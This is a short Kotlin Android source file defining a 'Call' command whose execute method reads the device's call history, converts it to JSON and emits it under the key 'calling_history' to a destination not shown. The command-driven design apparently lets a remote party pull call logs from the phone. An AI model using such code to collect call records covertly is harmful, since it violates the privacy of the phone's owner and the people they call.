package com.hc.calling.commands.callingtransaction

import android.content.Context
import com.google.gson.Gson
import com.hc.calling.commands.Command
import com.hc.calling.commands.Executor

/**
 * Created by ChanHong on 2019/3/25
 *
 */
class Call(context: Context) : Command(), Executor {
    var context: Context? = null

    init {
        this.context = context
    }

    companion object {
        const val SEND_CALLING_HISTORY = "send_calling_history"
        const val CALLING_HISTORY = "calling_history"
    }

    override fun execute(data: Array<Any>) {
        val history = Gson().toJson(CallingHistory.getDataList(context))
        emitData(CALLING_HISTORY, history)

    }

}